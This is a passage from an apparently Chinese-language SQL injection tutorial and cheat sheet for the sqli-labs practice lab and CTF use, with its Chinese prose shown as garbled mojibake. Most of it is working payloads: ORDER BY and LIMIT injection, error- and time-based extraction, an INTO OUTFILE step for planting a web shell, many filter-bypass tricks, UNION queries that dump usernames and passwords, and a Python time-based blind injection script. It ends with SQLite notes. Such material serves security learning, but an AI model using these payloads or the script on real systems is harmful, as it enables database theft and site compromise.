MODE]]</code></pre><p>æˆ‘ä»¬å¯åˆ©ç”¨order by åçš„ä¸€äº›å‚æ•°è¿›è¡Œæ³¨å…¥ã€‚</p><p>ï¼ˆ1ï¼‰ã€order by åçš„æ•°å­—å¯ä»¥ä½œä¸ºä¸€ä¸ªæ³¨å…¥ç‚¹ã€‚ä¹Ÿå°±æ˜¯æ„é€ order by åçš„ä¸€ä¸ªè¯­å¥ï¼Œè®©è¯¥è¯­å¥æ‰§è¡Œç»“æœä¸ºä¸€ä¸ªæ•°ï¼Œæˆ‘ä»¬å°è¯•</p><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=right(version(),1)</code></pre><p>æ²¡æœ‰æŠ¥é”™ï¼Œä½†æ˜¯right æ¢æˆleft éƒ½ä¸€æ ·ï¼Œè¯´æ˜æ•°å­—æ²¡æœ‰èµ·ä½œç”¨ï¼Œæˆ‘ä»¬è€ƒè™‘å¸ƒå°”ç±»å‹ã€‚æ­¤æ—¶æˆ‘ä»¬å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥å’Œå»¶æ—¶æ³¨å…¥ã€‚æ­¤å¤„å¯ä»¥ç›´æ¥æ„é€ ?sort= åé¢çš„ä¸€ä¸ªå‚æ•°ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æœ‰ä¸‰ç§å½¢å¼ï¼Œ</p><ul><li>ç›´æ¥æ·»åŠ æ³¨å…¥è¯­å¥ï¼Œ?sort=(select *<strong>*</strong>)</li><li>åˆ©ç”¨ä¸€äº›å‡½æ•°ã€‚ä¾‹å¦‚rand()å‡½æ•°ç­‰ã€‚?sort=rand(sql è¯­å¥) Psï¼šæ­¤å¤„æˆ‘ä»¬å¯ä»¥å±•ç¤ºä¸€ä¸‹rand(ture)å’Œrand(false)çš„ç»“æœæ˜¯ä¸ä¸€æ ·çš„ã€‚</li></ul><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=rand(false)</code></pre><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=rand(true</code></pre><ul><li>åˆ©ç”¨andï¼Œä¾‹å¦‚?sort=1 and (åŠ sql è¯­å¥)ã€‚</li></ul><p>åŒæ—¶ï¼Œsql è¯­å¥å¯ä»¥åˆ©ç”¨æŠ¥é”™æ³¨å…¥å’Œå»¶æ—¶æ³¨å…¥çš„æ–¹å¼ï¼Œè¯­å¥æˆ‘ä»¬å¯ä»¥å¾ˆçµæ´»çš„æ„é€ ã€‚</p><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=(select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))</code></pre><p>æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨rand()è¿›è¡Œæ¼”ç¤ºä¸€ä¸‹ï¼Œå› ä¸ºä¸Šé¢æåˆ°rand(true)å’Œrand(false)ç»“æœæ˜¯ä¸ä¸€æ ·çš„ã€‚</p><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=rand(ascii(left(database(),1))=115)http://127.0.0.1/sqli-labs/Less-46/?sort=rand(ascii(left(database(),1))=116)ä»ä¸Šè¿°ä¸¤ä¸ªå›¾çš„ç»“æœï¼Œå¯¹æ¯”rand(ture)å’Œrand(false)çš„ç»“æœï¼Œå¯ä»¥çœ‹å‡ºæŠ¥é”™æ³¨å…¥æ˜¯æˆåŠŸçš„ã€‚</code></pre><p>å»¶æ—¶æ³¨å…¥ä¾‹å­</p><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort= (SELECT IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,md5('1')),null) FROM (select database() as current) as tb1)http://127.0.0.1/sqli-labs/Less-46/?sort=1 and If(ascii(substr(database(),1,1))=116,0,sleep(5))</code></pre><p>åŒæ—¶ä¹Ÿå¯ä»¥ç”¨?sort=1 and åæ·»åŠ æ³¨å…¥è¯­å¥ã€‚</p><h3 id="procedure-analyse-å‚æ•°åæ³¨å…¥"><a href="#procedure-analyse-å‚æ•°åæ³¨å…¥" class="headerlink" title="procedure analyse å‚æ•°åæ³¨å…¥"></a>procedure analyse å‚æ•°åæ³¨å…¥</h3><p>æ­¤æ–¹æ³•é€‚ç”¨äºMySQL 5.xä¸­ï¼Œåœ¨limitè¯­å¥åé¢çš„æ³¨å…¥</p><p>åˆ©ç”¨procedure analyse å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡ŒæŠ¥é”™æ³¨å…¥ã€‚åŒæ—¶ï¼Œåœ¨procedure analyse å’Œorder by ä¹‹é—´å¯ä»¥å­˜åœ¨limit å‚æ•°ï¼Œæˆ‘ä»¬åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¾€å¾€ä¹Ÿå¯èƒ½ä¼šå­˜åœ¨limit åçš„æ³¨å…¥ï¼Œå¯ä»¥åˆ©ç”¨procedure analyse è¿›è¡Œæ³¨å…¥ã€‚</p><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=1  procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)//SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); å¦‚æœä¸æ”¯æŒæŠ¥é”™æ³¨å…¥çš„è¯ï¼Œè¿˜å¯ä»¥åŸºäºæ—¶é—´æ³¨å…¥ï¼š//SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code></pre><h3 id="å¯¼å…¥å¯¼å‡ºæ–‡ä»¶into-outfile-å‚æ•°"><a href="#å¯¼å…¥å¯¼å‡ºæ–‡ä»¶into-outfile-å‚æ•°" class="headerlink" title="å¯¼å…¥å¯¼å‡ºæ–‡ä»¶into outfile å‚æ•°"></a>å¯¼å…¥å¯¼å‡ºæ–‡ä»¶into outfile å‚æ•°</h3><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=1 into outfile "c:\\wamp\\www\\sqllib\\test1.txt"å°†æŸ¥è¯¢ç»“æœå¯¼å…¥åˆ°æ–‡ä»¶å½“ä¸­é‚£è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä¸Šä¼ ç½‘é©¬ï¼Œåˆ©ç”¨lines terminated byInto outtfile c:\\wamp\\www\\sqllib\\test1.txt lines terminated by 0x(ç½‘é©¬è¿›è¡Œ16 è¿›åˆ¶è½¬æ¢)</code></pre><h2 id="ç»•è¿‡è¿‡æ»¤"><a href="#ç»•è¿‡è¿‡æ»¤" class="headerlink" title="ç»•è¿‡è¿‡æ»¤"></a>ç»•è¿‡è¿‡æ»¤</h2><h3 id="ç©ºæ ¼è¢«è¿‡æ»¤"><a href="#ç©ºæ ¼è¢«è¿‡æ»¤" class="headerlink" title="ç©ºæ ¼è¢«è¿‡æ»¤"></a>ç©ºæ ¼è¢«è¿‡æ»¤</h3><pre class="language-none"><code class="language-none">/**/æ›¿ä»£ç©ºæ ¼%09 TAB é”®ï¼ˆæ°´å¹³ï¼‰%0a æ–°å»ºä¸€è¡Œ%0c æ–°çš„ä¸€é¡µ%0d return åŠŸèƒ½%0b TAB é”®ï¼ˆå‚ç›´ï¼‰%a0 ç©ºæ ¼() ä»£æ›¿ç©ºæ ¼ï¼Œåœ¨MySQLä¸­ï¼Œæ‹¬å·æ˜¯ç”¨æ¥åŒ…å›´å­æŸ¥è¯¢çš„ã€‚å› æ­¤ï¼Œä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥ï¼Œéƒ½å¯ä»¥ç”¨æ‹¬å·åŒ…å›´èµ·æ¥ã€‚</code></pre><p>%a0ï¿½</p><p>è¿™ä¸ªå¯ç®—æ˜¯ä¸€ä¸ªä¸æˆæ±‰å­—çš„ä¸­æ–‡å­—ç¬¦äº†ï¼Œé‚£è¿™åº”è¯¥å°±å¥½ç†è§£äº†ï¼Œå› ä¸º%a0çš„ç‰¹æ€§ï¼Œåœ¨è¿›è¡Œæ­£åˆ™åŒ¹é…æ—¶ï¼ŒåŒ¹é…åˆ°å®ƒæ—¶æ˜¯è¯†åˆ«ä¸ºä¸­æ–‡å­—ç¬¦çš„ï¼Œæ‰€ä»¥ä¸ä¼šè¢«è¿‡æ»¤æ‰ï¼Œä½†æ˜¯åœ¨è¿›å…¥SQLè¯­å¥åï¼ŒMysqlæ˜¯ä¸è®¤ä¸­æ–‡å­—ç¬¦çš„ï¼Œæ‰€ä»¥ç›´æ¥å½“ä½œç©ºæ ¼å¤„ç†ï¼Œå°±è¿™æ ·ï¼Œæˆ‘ä»¬ä¾¿è¾¾æˆäº†Bypassçš„ç›®çš„ï¼ŒæˆåŠŸç»•è¿‡ç©ºæ ¼+æ³¨é‡Šçš„è¿‡æ»¤</p><h3 id="è¿‡æ»¤å•å¼•å·"><a href="#è¿‡æ»¤å•å¼•å·" class="headerlink" title="è¿‡æ»¤å•å¼•å·"></a>è¿‡æ»¤å•å¼•å·</h3><p>å½“åœ¨ç™»å½•æ—¶ä½¿ç”¨çš„æ˜¯å¦‚ä¸‹SQLè¯­å¥ï¼š</p><pre class="language-none"><code class="language-none">select user from user where user='$_POST[username]' and password='$_POST[password]';</code></pre><p>åœ¨è¿™é‡Œå•å¼•å·è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯åæ–œæ <code>\</code>å¹¶æ²¡æœ‰è¢«è¿‡æ»¤ã€‚åˆ™å•å¼•å·å¯ä»¥è¢«è½¬ä¹‰</p><p>è¾“å…¥çš„ç”¨æˆ·åä»¥åæ–œæ <code>\</code>ç»“å°¾</p><pre class="language-none"><code class="language-none">username=admin\&amp;password=123456#å°†è¿™ä¸ªæ‹¼æ¥è¿›å»ï¼Œ\å°±å¯ä»¥å°†ç¬¬2ä¸ªå•å¼•å·è½¬ä¹‰æ‰select * from users where username='admin\' and password='123456#';è¿™æ ·ç¬¬1ä¸ªå•å¼•å·å°±ä¼šæ‰¾ç¬¬3ä¸ªå•å¼•å·è¿›è¡Œé—­åˆï¼Œåå°æ¥æ”¶åˆ°çš„usernameå®é™…ä¸Šæ˜¯admin\' and password=è¿™ä¸ªæ•´ä½“æ¥ä¸‹æ¥æ„é€ passwordä¸ºor 2&gt;1#select * from users where username='admin\' and password=' or 2&gt;1#';ä¸Šé¢çš„è¯­å¥ä¼šè¿”å›ä¸ºçœŸï¼Œé€šè¿‡è¿™æ ·çš„æ€è·¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œboolç›²æ³¨</code></pre><h3 id="æ³¨é‡Šç¬¦"><a href="#æ³¨é‡Šç¬¦" class="headerlink" title="æ³¨é‡Šç¬¦"></a>æ³¨é‡Šç¬¦</h3><pre class="language-none"><code class="language-none">//--%20/**/#--+-- -%00;;%00;\x00</code></pre><h3 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h3><h3 id="åŒå†™ç»•è¿‡"><a href="#åŒå†™ç»•è¿‡" class="headerlink" title="åŒå†™ç»•è¿‡"></a>åŒå†™ç»•è¿‡</h3><h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><p>åˆ©ç”¨urlencodeï¼Œascii(char)ï¼Œhexï¼Œunicodeç­‰ç¼–ç ç»•è¿‡</p><pre class="language-none"><code class="language-none">or 1=1å³%6f%72%20%31%3d%31ï¼Œè€ŒTestä¹Ÿå¯ä»¥ä¸ºCHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)ã€‚åå…­è¿›åˆ¶ç¼–ç SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))åŒé‡ç¼–ç ç»•è¿‡?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+ä¸€äº›unicodeç¼–ç ä¸¾ä¾‹ï¼š    å•å¼•å·ï¼š'%u0027 %u02b9 %u02bc%u02c8 %u2032%uff07 %c0%27%c0%a7 %e0%80%a7ç©ºç™½ï¼š%u0020 %uff00%c0%20 %c0%a0 %e0%80%a0å·¦æ‹¬å·(:%u0028 %uff08%c0%28 %c0%a8%e0%80%a8å³æ‹¬å·):%u0029 %uff09%c0%29 %c0%a9%e0%80%a9</code></pre><h3 id="likeç»•è¿‡"><a href="#likeç»•è¿‡" class="headerlink" title="likeç»•è¿‡"></a>likeç»•è¿‡</h3><pre class="language-none"><code class="language-none">?id=1' or 1 like 1#å¯ä»¥ç»•è¿‡å¯¹ = &gt; ç­‰è¿‡æ»¤</code></pre><h3 id="inç»•è¿‡"><a href="#inç»•è¿‡" class="headerlink" title="inç»•è¿‡"></a>inç»•è¿‡</h3><pre class="language-none"><code class="language-none">or '1' IN ('1234')#å¯ä»¥æ›¿ä»£=</code></pre><h3 id="ç­‰ä»·å‡½æ•°æˆ–å˜é‡"><a href="#ç­‰ä»·å‡½æ•°æˆ–å˜é‡" class="headerlink" title="ç­‰ä»·å‡½æ•°æˆ–å˜é‡"></a>ç­‰ä»·å‡½æ•°æˆ–å˜é‡</h3><pre class="language-none"><code class="language-none">hex()ã€bin() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()mid()ã€substr() ==&gt; substring()@@user ==&gt; user()@@datadir ==&gt; datadir()ä¸¾ä¾‹ï¼šsubstring()å’Œsubstr()æ— æ³•ä½¿ç”¨æ—¶ï¼š?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74ã€€æˆ–è€…ï¼šsubstr((select 'password'),1,1) = 0x70strcmp(left('password',1), 0x69) = 1strcmp(left('password',1), 0x70) = 0strcmp(left('password',1), 0x71) = -1</code></pre><h3 id="åå¼•å·ç»•è¿‡"><a href="#åå¼•å·ç»•è¿‡" class="headerlink" title="åå¼•å·ç»•è¿‡"></a>åå¼•å·ç»•è¿‡</h3><pre class="language-none"><code class="language-none">select `version()`ï¼Œå¯ä»¥ç”¨æ¥è¿‡ç©ºæ ¼å’Œæ­£åˆ™ï¼Œç‰¹æ®Šæƒ…å†µä¸‹è¿˜å¯ä»¥å°†å…¶åšæ³¨é‡Šç¬¦ç”¨</code></pre><h3 id="è¿‡æ»¤union"><a href="#è¿‡æ»¤union" class="headerlink" title="è¿‡æ»¤union"></a>è¿‡æ»¤union</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union'è¿‡æ»¤ä»£ç  union select user,password from usersç»•è¿‡æ–¹å¼ 1 &amp;&amp; (select user from users where userid=1)='admin'</code></pre><h3 id="è¿‡æ»¤where"><a href="#è¿‡æ»¤where" class="headerlink" title="è¿‡æ»¤where"></a>è¿‡æ»¤where</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where'è¿‡æ»¤ä»£ç  1 &amp;&amp; (select user from users where user_id = 1) = 'admin'ç»•è¿‡æ–¹å¼ 1 &amp;&amp; (select user from users limit 1) = 'admin'</code></pre><h3 id="è¿‡æ»¤limit"><a href="#è¿‡æ»¤limit" class="headerlink" title="è¿‡æ»¤limit"></a>è¿‡æ»¤limit</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit'è¿‡æ»¤ä»£ç  1 &amp;&amp; (select user from users limit 1) = 'admin'ç»•è¿‡æ–¹å¼ 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = 'admin'#user_idèšåˆä¸­user_idä¸º1çš„userä¸ºadmin</code></pre><h3 id="è¿‡æ»¤group-by"><a href="#è¿‡æ»¤group-by" class="headerlink" title="è¿‡æ»¤group by"></a>è¿‡æ»¤group by</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit|group by'è¿‡æ»¤ä»£ç  1 &amp;&amp; (select user from users group by user_id having user_id = 1) = 'admin'ç»•è¿‡æ–¹å¼ 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1</code></pre><h3 id="è¿‡æ»¤select"><a href="#è¿‡æ»¤select" class="headerlink" title="è¿‡æ»¤select"></a>è¿‡æ»¤select</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit|group by|select'è¿‡æ»¤ä»£ç  1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1åªèƒ½æŸ¥è¯¢æœ¬è¡¨ä¸­çš„æ•°æ®ç»•è¿‡æ–¹å¼ 1 &amp;&amp; substr(user,1,1) = 'a'</code></pre><p>mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚</p><pre class="language-none"><code class="language-none">handler users open as hd; #æŒ‡å®šæ•°æ®è¡¨è¿›è¡Œè½½å…¥å¹¶å°†è¿”å›å¥æŸ„é‡å‘½åhandler hd read first; #è¯»å–æŒ‡å®šè¡¨/å¥æŸ„çš„é¦–è¡Œæ•°æ®handler hd read next; #è¯»å–æŒ‡å®šè¡¨/å¥æŸ„çš„ä¸‹ä¸€è¡Œæ•°æ®handler hd close; #å…³é—­å¥æŸ„</code></pre><h3 id="è¿‡æ»¤â€™-å•å¼•å·"><a href="#è¿‡æ»¤â€™-å•å¼•å·" class="headerlink" title="è¿‡æ»¤â€™(å•å¼•å·)"></a>è¿‡æ»¤â€™(å•å¼•å·)</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit|group by|select|\''è¿‡æ»¤ä»£ç  1 &amp;&amp; substr(user,1,1) = 'a'ç»•è¿‡æ–¹å¼ 1 &amp;&amp; user_id is not null    1 &amp;&amp; substr(user,1,1) = 0x61    1 &amp;&amp; substr(user,1,1) = unhex(61)</code></pre><h3 id="è¿‡æ»¤hex"><a href="#è¿‡æ»¤hex" class="headerlink" title="è¿‡æ»¤hex"></a>è¿‡æ»¤hex</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit|group by|select|\'|hex'è¿‡æ»¤ä»£ç  1 &amp;&amp; substr(user,1,1) = unhex(61)ç»•è¿‡æ–¹å¼ 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #åè¿›åˆ¶çš„11è½¬åŒ–ä¸ºåå…­è¿›åˆ¶ï¼Œå¹¶å°å†™ã€‚</code></pre><h3 id="è¿‡æ»¤substr"><a href="#è¿‡æ»¤substr" class="headerlink" title="è¿‡æ»¤substr"></a>è¿‡æ»¤substr</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit|group by|select|\'|hex|substr'è¿‡æ»¤ä»£ç  1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) ç»•è¿‡æ–¹å¼ 1 &amp;&amp; lpad(user(),1,1) in 'r'</code></pre><h3 id="è¿‡æ»¤-é€—å·"><a href="#è¿‡æ»¤-é€—å·" class="headerlink" title="è¿‡æ»¤,é€—å·"></a>è¿‡æ»¤<code>,</code>é€—å·</h3><pre class="language-none"><code class="language-none">//è¿‡æ»¤äº†é€—å·æ€ä¹ˆåŠï¼Ÿå°±ä¸èƒ½å¤šä¸ªå‚æ•°äº†å—ï¼ŸSELECT SUBSTR('2018-08-17',6,5);ä¸SELECT SUBSTR('2018-08-17' FROM 6 FOR 5);æ„æ€ç›¸åŒsubstræ”¯æŒè¿™æ ·çš„è¯­æ³•ï¼šSUBSTRING(str FROM pos FOR len)SUBSTRING(str FROM pos)MID()åç»­åŠ å…¥äº†è¿™ç§å†™æ³•</code></pre><h2 id="å¸¸ç”¨Payloadæ€»ç»“"><a href="#å¸¸ç”¨Payloadæ€»ç»“" class="headerlink" title="å¸¸ç”¨Payloadæ€»ç»“"></a>å¸¸ç”¨Payloadæ€»ç»“</h2><pre class="language-none"><code class="language-none">//è”åˆæŸ¥è¯¢//è·å–å½“å‰æ•°æ®åº“çš„è¡¨å1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #//è·å–è¡¨ä¸­çš„å­—æ®µå1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #//æŸ¥è¯¢æ•°æ®1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #//å¦‚æœgroup_concatè¢«è¿‡æ»¤äº†ï¼Œè€Œåˆåªèƒ½è¿”å›ä¸€æ¡æ•°æ®ï¼Œåˆ™ç”¨limit 0,1//å¸ƒå°”ç›²æ³¨è„šæœ¬import requests as reqimport time as timport stringurl = "xxx"select = "select group_concat(table_name) from information_schema.tables where binary table_schema in (select databases())"select = "select group_concat(column_name) from information_schema.columns where binary table_name in ('xxxx') "select = "select group_concat(xxxx) from xxxxxxx"res = ""def text2hex(s):    res = ""    for i in s:        res +=hex(ord(i)).replace("0x", "")    return "0x" + resfor i in range(1,50):    for ascii in string.printable:        if ascii == '\\': #è½¬ä¹‰ç¬¦å·æ²¡æœ‰æ„ä¹‰            continue        data = {            "username" : "admin",            "password" : f"123' or if((binary right(({select},{i}) in ({text2hex(ascii+res)})),(select benchmark(15000000.sha1(sha(sha(1)))) in (0)),0)#".replace(" ", "/**/")        }        start = int(t.time())        r = req.post(url=url, data=data)        end = int(t.time()) - start        print(data)        if end &gt; 4:            res = ascii +res            print(res)            break        if ascii == string.printable[-1:]:            exit(0)</code></pre><h1 id="Sqliteæ³¨å…¥"><a href="#Sqliteæ³¨å…¥" class="headerlink" title="Sqliteæ³¨å…¥"></a>Sqliteæ³¨å…¥</h1><h2 id="æ³¨é‡Šç¬¦-1"><a href="#æ³¨é‡Šç¬¦-1" class="headerlink" title="æ³¨é‡Šç¬¦"></a>æ³¨é‡Šç¬¦</h2><pre class="language-none"><code class="language-none">/**/--ä¸¤ç§æ³¨é‡Šç¬¦ --åé¢ä¸å¸¦ç©ºæ ¼ </code></pre><p>å¯ä»¥ç”¨äºåˆ¤æ–­æ•°æ®åº“ç±»å‹</p><p><code>#</code>å¦‚æœä¸ç”Ÿæ•ˆçš„è¯åˆ™è¯´æ˜ä¸æ˜¯<code>mysql</code></p><h2 id="sqliteç³»ç»Ÿåº“"><a href="#sqliteç³»ç»Ÿåº“" class="headerlink" title="sqliteç³»ç»Ÿåº“"></a>sqliteç³»ç»Ÿåº“</h2><pre class="language-none"><code class="language-none">--å…ˆåˆ›å»ºä¸¤ä¸ªè¡¨CREATE TABLE GIFT(ID INT PRIMARY KEY NOT NULL,ITEM TEXT NOT NULL,LOG TEXT NOT NULL);CREATE TABLE SECRET(ID INT NOT NULL,fl4ggg TEXT PRIMARY KEY NOT NULL);INSERT INTO GIFT (ID,ITEM,LOG) VALUES (1, "Turkey", "Most British families liketo cook their own turkey. A large number of vegetables and fruits, such asasparagus, celery, onions and chestnuts, are stuffed into the belly of a tenpound turkey, and then coated with a variety of spices before being baked inthe oven.");INSERT INTO SECRET (id,fl4ggg) VALUES (1, "flag{Y1ng}");</code></pre><p>åœ¨<code>mysql</code>ä¸­æŸ¥è¯¢åº“åã€è¡¨åç­‰æœ‰ç³»ç»Ÿæ•°æ®åº“<code>information_schema</code>ï¼Œè€Œåœ¨<code>sqlite</code>ä¸­åˆ™æ˜¯è¡¨<code>sqlite_master</code></p><pre class="language-none"><code class="language-none">sqlite&gt; .schema sqlite_masterCREATE TABLE sqlite_master (  type text,  name text,  tbl_name text,  rootpage integer,  sql text);</code></pre><pre class="language-none"><code class="language-none">--æŸ¥è¯¢è¡¨åsqlite&gt; SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';GIFTSECRET--æ³¨ï¼šè¿™é‡Œä¹‹æ‰€ä»¥ä½¿ç”¨NOT like 'sqlite_%'ï¼Œæ˜¯é¿å…å‡ºæ¥ç³»ç»Ÿçš„è¡¨ï¼Œä½†æ˜¯å¯èƒ½é¢˜ç›®æ•…æ„å°†è¡¨åå¼„æˆsqliteå¼€å¤´--æŸ¥è¯¢åˆ—åsqlite&gt; SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='GIFT';CREATE TABLE GIFT(ID INT PRIMARY KEY NOT NULL,ITEM TEXT NOT NULL,LOG TEXT NOT NULL)sqlite&gt; SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='SECRET';CREATE TABLE SECRET(ID INT NOT NULL,fl4ggg TEXT PRIMARY KEY NOT NULL)</code></pre><h2 id="å­—ç¬¦ä¸²æˆªå–"><a href="#å­—ç¬¦ä¸²æˆªå–" class="headerlink" title="å­—ç¬¦ä¸²æˆªå–"></a>å­—ç¬¦ä¸²æˆªå–</h2><p>ä¸<code>mysql</code>ç±»ä¼¼ï¼Œ<code>sqlite</code>ä¸­ä¹Ÿæœ‰å­—ç¬¦ä¸²æˆªå–çš„å‡½æ•°</p><p><code>substr()ã€substring()ã€likeã€=ã€&gt;ã€&lt;ã€inã€between</code>ï¼Œè¿™äº›ä¸<code>mysql</code>å·®ä¸å¤š</p><p>è€Œ<code>sqlite</code>ç‰¹æœ‰çš„</p><p><strong>TRIM</strong></p><pre class="language-none"><code class="language-none">TRIM (å­—ç¬¦ä¸²,è¦ç§»é™¤çš„å­—ç¬¦) å¦‚æœè¦ç§»é™¤çš„å­—ç¬¦ä¸å†™ï¼Œé»˜è®¤æ˜¯ç©ºæ ¼LTRIM å­—ç¬¦ä¸²å¼€å¤´éƒ¨åˆ†ç§»é™¤RTRIM å­—ç¬¦ä¸²ç»“å°¾éƒ¨åˆ†ç§»é™¤--è¿™ä¸ªå‡½æ•°ä¸mysqlä¸­çš„TRIMç”¨æ³•ä¸ä¸€æ ·sqlite&gt; select trim('aaaadsd','a');dsdsqlite&gt; select trim('aaaadsda','a');dsdå¯ä»¥é€šè¿‡ç‰¹å®šçš„trimæ„é€ ï¼Œå®ç°right()å’Œleft()çš„åŠŸèƒ½sqlite&gt; select ltrim('casdasd','a') = ltrim("casdasd","c");0--é€šè¿‡ltrimå»é™¤å­—ç¬¦ä¸åä¸€ä¸ªtrimåˆ¤æ–­ç›¸ç­‰ï¼Œç¡®å®šå­—ç¬¦</code></pre><p><strong>printf(FORMAT,â€¦)</strong></p><pre class="language-none"><code class="language-none">sqlite&gt; select printf('%.1s','aaaaa');asqlite&gt; select printf('%.2s','aaaaa');aasqlite&gt; select printf('%.3s','aaaaa');aaa--é€šè¿‡printfå‡½æ•°æ ¼å¼åŒ–æ“ä½œå¯¹å­—ç¬¦ä¸²æˆªå–</code></pre><p>é€šè¿‡<code>printf</code>åˆ¤æ–­é•¿åº¦</p><pre class="language-none"><code class="language-none">--å¦‚æœprintf('%.is', 'abc')=printf('%.i+1s', 'abc') åˆ™è¯´æ˜å­—ç¬¦ä¸²é•¿åº¦ä¸ºisqlite&gt; select printf('%.5s','aaaaa') = printf('%.6s','aaaaa');1</code></pre><h2 id="æ¯”è¾ƒ"><a href="#æ¯”è¾ƒ" class="headerlink" title="æ¯”è¾ƒ"></a>æ¯”è¾ƒ</h2><p><strong>GLOB</strong></p><p>è¿ç®—ç¬¦æ˜¯ç”¨æ¥åŒ¹é…é€šé…ç¬¦æŒ‡å®šæ¨¡å¼çš„æ–‡æœ¬å€¼ã€‚å¦‚æœæœç´¢è¡¨è¾¾å¼ä¸æ¨¡å¼è¡¨è¾¾å¼åŒ¹é…ï¼ŒGLOB è¿ç®—ç¬¦å°†è¿”å›1ã€‚ä¸LIKE è¿ç®—ç¬¦ä¸åŒçš„æ˜¯ï¼Œ<strong>GLOB æ˜¯å¤§å°å†™æ•æ„Ÿçš„</strong>ï¼Œå¯¹äºä¸‹é¢çš„é€šé…ç¬¦ï¼Œå®ƒéµå¾ªUNIX çš„è¯­æ³•ã€‚</p><ul><li>æ˜Ÿå·<code>*</code></li><li>é—®å·<code>?</code></li><li>æ˜Ÿå·<code>*</code>ä»£è¡¨é›¶ä¸ªã€ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—æˆ–å­—ç¬¦ã€‚é—®å·<code>?</code>ä»£è¡¨ä¸€ä¸ªå•ä¸€çš„æ•°å­—æˆ–å­—ç¬¦ã€‚è¿™äº›ç¬¦å·å¯ä»¥è¢«ç»„åˆä½¿ç”¨ã€‚</li></ul><p><strong>LIKE</strong></p><p><strong>LIKE</strong> è¿ç®—ç¬¦æ˜¯ç”¨æ¥åŒ¹é…é€šé…ç¬¦æŒ‡å®šæ¨¡å¼çš„æ–‡æœ¬å€¼ã€‚å¦‚æœæœç´¢è¡¨è¾¾å¼ä¸æ¨¡å¼è¡¨è¾¾å¼åŒ¹é…ï¼ŒLIKE è¿ç®—ç¬¦å°†è¿”å›çœŸï¼ˆtrueï¼‰ï¼Œä¹Ÿå°±æ˜¯ 1ã€‚è¿™é‡Œæœ‰ä¸¤ä¸ªé€šé…ç¬¦ä¸ LIKE 